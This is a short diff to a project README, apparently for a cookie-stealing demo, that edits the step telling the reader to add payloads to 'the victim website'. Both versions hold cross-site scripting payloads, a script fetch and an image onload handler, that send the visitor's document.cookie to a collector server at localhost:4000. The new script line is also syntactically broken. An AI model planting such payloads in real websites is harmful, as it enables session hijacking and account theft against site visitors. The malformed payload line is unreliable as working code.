@@ -28,5 +28,5 @@ To run this project, follow these steps:
 
 6. Add these to the victim website: 
 
-   - the script way: <script>fetch('http://localhost:4000?data=${document.cookie}')</script>
-   - the image way: <img src="abc" onload=this.src='http://localhost:4000?data='+document.cookie>
+   - the script way: <script>fetch('http://localhost:4000?data='document.cookie)</script>
+   - the image way: <img src="abc" onload="this.src='http://localhost:4000?data='+document.cookie">
